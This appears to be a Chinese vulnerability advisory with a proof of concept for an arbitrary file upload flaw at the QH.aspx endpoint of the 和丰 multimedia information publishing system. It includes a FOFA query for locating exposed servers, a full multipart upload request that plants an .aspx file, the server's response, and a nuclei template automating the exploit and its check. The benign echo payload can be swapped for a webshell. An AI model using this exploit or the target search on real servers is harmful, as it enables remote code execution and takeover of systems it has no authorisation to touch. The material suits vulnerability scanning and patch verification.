**漏洞名称**

和丰多媒体信息发布系统 QH.aspx 任意文件上传漏洞

**漏洞影响**

和丰多媒体信息发布系统

**漏洞描述**

和丰多媒体信息发布系统是一种用于多媒体信息发布和管理的系统。它提供了多种功能，包括但不限于图片、视频、文字等多种形式的信息发布和展示。该系统能够根据用户需求，灵活地管理和展示各类信息内容，为用户提供良好的信息浏览和管理体验。和丰多媒体信息发布系统 存在文件上传漏洞,恶意攻击者可以上传恶意软件，例如后门、木马或勒索软件，以获取对服务器的远程访问权限或者破坏系统，对服务器造成极大的安全隐患。

**FOFA搜索语句**

```
app="和丰山海-数字标牌"
```

**漏洞复现**

```yaml

POST /QH.aspx HTTP/1.1
Host: x.x.x.x
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0
Connection: close
Content-Length: 583
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryeegvclmyurlotuey
Accept-Encoding: gzip

------WebKitFormBoundaryeegvclmyurlotuey
Content-Disposition: form-data; name="fileToUpload"; filename="kjuhitjgk.aspx"
Content-Type: application/octet-stream

<% response.write("ujidwqfuuqjalgkvrpqy") %>
------WebKitFormBoundaryeegvclmyurlotuey
Content-Disposition: form-data; name="action"

upload
------WebKitFormBoundaryeegvclmyurlotuey
Content-Disposition: form-data; name="responderId"

ResourceNewResponder
------WebKitFormBoundaryeegvclmyurlotuey
Content-Disposition: form-data; name="remotePath"

/opt/resources
------WebKitFormBoundaryeegvclmyurlotuey--
```

响应内容如下

```yaml
HTTP/1.1 200 OK
Connection: close
Content-Length: 63
Cache-Control: no-cache
Content-Type: text/html; charset=utf-8
Date: Wed, 22 May 2024 09:54:10 GMT
Expires: -1
Pragma: no-cache
Server: HowFor Web Server/5.6.0.0
Set-Cookie: ASP.NET_SessionId=e3csbbmt3k3g3aabpjyrdjje; path=/; HttpOnly; SameSite=Lax
X-Aspnet-Version: 4.0.30319

{
  "first": true,
  "second": [
    "kjuhitjgk.aspx"
  ]
}
```

第二步，查看回显文件

```
http://x.x.x.x/opt/resources/kjuhitjgk.aspx
```

漏洞复现成功

**nuclei poc**

```yaml
id: hefeng-qh-fileupload

info:
  name: 和丰多媒体信息发布系统 QH.aspx 任意文件上传漏洞
  author: fgz
  severity: critical
  description: 和丰多媒体信息发布系统是一种用于多媒体信息发布和管理的系统。它提供了多种功能，包括但不限于图片、视频、文字等多种形式的信息发布和展示。该系统能够根据用户需求，灵活地管理和展示各类信息内容，为用户提供良好的信息浏览和管理体验。和丰多媒体信息发布系统 存在文件上传漏洞,恶意攻击者可以上传恶意软件，例如后门、木马或勒索软件，以获取对服务器的远程访问权限或者破坏系统，对服务器造成极大的安全隐患。该系统QH.aspx接口处存在任意文件上传漏洞，容易导致系统被远控。
  metadata:
    max-request: 1
    fofa-query: app="和丰山海-数字标牌"
    verified: true
variables:
  file_name: "{{to_lower(rand_text_alpha(8))}}"
  file_content: "{{to_lower(rand_text_alpha(20))}}"
  rboundary: "{{to_lower(rand_text_alpha(16))}}"
requests:
  - raw:
      - |+
        POST /QH.aspx HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
        
        ------WebKitFormBoundary{{rboundary}}
        Content-Disposition: form-data; name="fileToUpload"; filename="{{file_name}}.aspx"
        Content-Type: application/octet-stream
        
        <% response.write("{{file_content}}") %>
        ------WebKitFormBoundary{{rboundary}}
        Content-Disposition: form-data; name="action"
        
        upload
        ------WebKitFormBoundary{{rboundary}}
        Content-Disposition: form-data; name="responderId"
        
        ResourceNewResponder
        ------WebKitFormBoundary{{rboundary}}
        Content-Disposition: form-data; name="remotePath"
        
        /opt/resources
        ------WebKitFormBoundary{{rboundary}}--

      - |
        GET /opt/resources/{{file_name}}.aspx HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
        Accept-Encoding: gzip

    matchers:
      - type: dsl
        dsl:
          - "status_code_1 == 200 && status_code_2 == 200 && contains(body_2, '{{file_content}}')"
```

**修复建议**

升级到最新版本。